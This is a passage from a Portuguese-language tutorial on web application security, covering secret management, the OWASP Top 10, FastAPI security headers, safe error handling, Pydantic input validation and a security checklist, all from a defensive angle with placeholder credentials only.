# .env (nunca commitar — no .gitignore)
DATABASE_URL=postgresql://admin:senha@localhost:5432/app
STRIPE_KEY=sk_test_abc123

# .env.example (commitar — mostra quais variáveis são necessárias, sem valores)
DATABASE_URL=
STRIPE_KEY=
```

**Em produção — use um gerenciador de segredos:**

```
AWS Secrets Manager / Parameter Store:
  → Armazena segredos criptografados na AWS
  → Rotação automática de senhas de banco
  → Auditoria de quem acessou qual segredo e quando
  → Aplicação busca via SDK, nunca via variáveis de ambiente fixas

HashiCorp Vault:
  → Solução open-source agnóstica de nuvem
  → Suporta segredos dinâmicos (gera credenciais temporárias por requisição)

Kubernetes Secrets:
  → Para aplicações no K8s, segredos são injetados como variáveis
    de ambiente ou volumes, sem tocar no código
```

---

## 8. OWASP Top 10

O **OWASP (Open Web Application Security Project)** publica a lista das 10 vulnerabilidades mais críticas em aplicações web. É a referência global para segurança de software:

| # | Vulnerabilidade | Exemplo |
|---|---|---|
| 1 | **Broken Access Control** | IDOR, escalada de privilégios, CORS mal configurado |
| 2 | **Cryptographic Failures** | Dados sensíveis em HTTP, MD5 para senhas, chaves expostas |
| 3 | **Injection** | SQL Injection, LDAP Injection, Command Injection |
| 4 | **Insecure Design** | Ausência de rate limiting, flows sem validação de negócio |
| 5 | **Security Misconfiguration** | Portas abertas, erros detalhados em produção, CORS aberto |
| 6 | **Vulnerable Components** | Bibliotecas desatualizadas com CVEs conhecidos |
| 7 | **Auth & Session Failures** | Senhas fracas permitidas, sessões que nunca expiram |
| 8 | **Software Integrity Failures** | Dependências sem verificação de integridade |
| 9 | **Logging & Monitoring Failures** | Sem logs de eventos de segurança, sem alertas |
| 10 | **SSRF** | Aplicação busca URLs fornecidas pelo usuário sem validação |

> Broken Access Control é o #1 desde 2021 — e é um dos mais fáceis de prevenir. A ausência de uma simples verificação de propriedade (`pedido.user_id == usuario_atual.id`) é responsável por incontáveis vazamentos.

---

## 9. Segurança em APIs REST

Além dos ataques gerais, APIs têm superfícies de ataque específicas:

### Headers de Segurança Essenciais

```python
# FastAPI com middleware de segurança:
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware

app.add_middleware(HTTPSRedirectMiddleware)
app.add_middleware(TrustedHostMiddleware, allowed_hosts=["meusite.com", "*.meusite.com"])

@app.middleware("http")
async def adicionar_headers_seguranca(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    # Remove informação sobre o servidor (não revele tecnologia usada)
    del response.headers["server"]
    return response
```

### Não Vazar Informações em Erros

```python
# ✗ Em produção — revela stack trace, versões, estrutura do banco
{
  "error": "psycopg2.errors.UndefinedTable: relation \"users\" does not exist",
  "traceback": "File \"/app/api.py\", line 42, in get_user..."
}

# ✓ Em produção — mensagem genérica, log detalhado interno
{
  "error": "Erro interno. Por favor, tente novamente.",
  "request_id": "req_abc123"  ← ID para correlacionar com o log interno
}
```

```python
import logging
import uuid

@app.exception_handler(Exception)
async def handler_global(request: Request, exc: Exception):
    request_id = str(uuid.uuid4())
    logging.error(f"[{request_id}] Erro não tratado: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={"error": "Erro interno", "request_id": request_id}
    )
```

### Validação de Input

```python
from pydantic import BaseModel, EmailStr, field_validator
import re

class CriarUsuarioRequest(BaseModel):
    email: EmailStr              # Pydantic valida formato de email
    senha: str
    nome: str

    @field_validator("senha")
    @classmethod
    def senha_forte(cls, v):
        if len(v) < 12:
            raise ValueError("Senha deve ter pelo menos 12 caracteres")
        if not re.search(r"[A-Z]", v):
            raise ValueError("Senha deve conter ao menos uma letra maiúscula")
        if not re.search(r"[0-9]", v):
            raise ValueError("Senha deve conter ao menos um número")
        if not re.search(r"[^A-Za-z0-9]", v):
            raise ValueError("Senha deve conter ao menos um caractere especial")
        return v

    @field_validator("nome")
    @classmethod
    def sanitizar_nome(cls, v):
        # Remove tags HTML potencialmente maliciosas
        import html
        return html.escape(v.strip())
```

---

## 10. Checklist de Segurança

### Autenticação
- [ ] Senhas hasheadas com BCrypt ou Argon2id (nunca MD5/SHA1/SHA256 puras)
- [ ] Salt único por usuário (BCrypt/Argon2 fazem isso automaticamente)
- [ ] Rate limiting no endpoint de login (por email e por IP)
- [ ] Mensagem de erro genérica (não revela se email existe)
- [ ] MFA disponível (especialmente para contas admin)
- [ ] Tokens com expiração curta (Access Token ≤ 1h)
- [ ] Refresh Tokens armazenados com hash no banco

### Autorização
- [ ] Toda rota protegida verifica autenticação
- [ ] Toda operação verifica se o usuário tem acesso àquele recurso específico (evitar IDOR)
- [ ] Princípio do menor privilégio aplicado a roles e API keys

### Dados
- [ ] HTTPS em todos os ambientes (incluindo staging)
- [ ] HSTS habilitado
- [ ] Segredos em variáveis de ambiente ou gerenciador de segredos
- [ ] Nenhum segredo commitado no git
- [ ] Dados sensíveis não aparecendo em logs

### Código
- [ ] Queries SQL parametrizadas (nunca concatenação de strings)
- [ ] Input sanitizado antes de renderizar HTML
- [ ] Headers de segurança configurados
- [ ] Stack traces não expostos em produção
- [ ] Dependências atualizadas (use `npm audit`, `pip-audit`, `trivy`)

### Monitoramento
- [ ] Logs de eventos de segurança (logins, falhas, acessos negados)
- [ ] Alertas para padrões anômalos (muitas falhas de login, volume incomum)
- [ ] IDs de requisição para correlacionar logs com erros reportados

---

## Resumo Visual

```
┌─────────────────────────────────────────────────────────────────────┐
│              AUTENTICAÇÃO, AUTORIZAÇÃO E SEGURANÇA                  │
├──────────────────────┬──────────────────────────────────────────────┤
│ Autenticação         │ "Quem é você?" — verifica identidade         │
│                      │ Fatores: sabe / tem / é                      │
│                      │ MFA = combinação de fatores                  │
├──────────────────────┼──────────────────────────────────────────────┤
│ Autorização          │ "O que pode fazer?" — verifica permissões    │
│                      │ RBAC: roles com permissões                   │
│                      │ ABAC: atributos do usuário + recurso         │
│                      │ Princípio do menor privilégio                │
├──────────────────────┼──────────────────────────────────────────────┤
│ Tokens               │ JWT: stateless, validação local              │
│                      │ Session: stateful, revogação imediata        │
│                      │ Access (curto) + Refresh (longo)             │
│                      │ Armazenar em HttpOnly cookie                 │
├──────────────────────┼──────────────────────────────────────────────┤
│ Senhas               │ NUNCA texto puro ou MD5/SHA1                 │
│                      │ BCrypt ou Argon2id com salt                  │
│                      │ Slow hashing é intencional                   │
│                      │ Mensagem genérica (evitar user enumeration)  │
├──────────────────────┼──────────────────────────────────────────────┤
│ Ataques              │ SQL Injection → prepared statements          │
│                      │ XSS → escapar output, CSP                   │
│                      │ CSRF → SameSite cookie, CSRF token           │
│                      │ Brute force → rate limiting, MFA             │
│                      │ IDOR → sempre verificar posse do recurso     │
├──────────────────────┼──────────────────────────────────────────────┤
│ Transporte           │ HTTPS obrigatório (TLS 1.2+)                │
│                      │ HSTS para forçar HTTPS no browser            │
│                      │ Certificados Let's Encrypt (gratuito)        │
└──────────────────────┴──────────────────────────────────────────────┘
```

Segurança não é uma funcionalidade que se adiciona depois — é uma disciplina que permeia cada decisão de design. Um sistema com ótima performance e arquitetura elegante, mas com autenticação fraca e senhas em MD5, pode ser completamente comprometido em minutos. **Segurança é a base, não o detalhe final.**
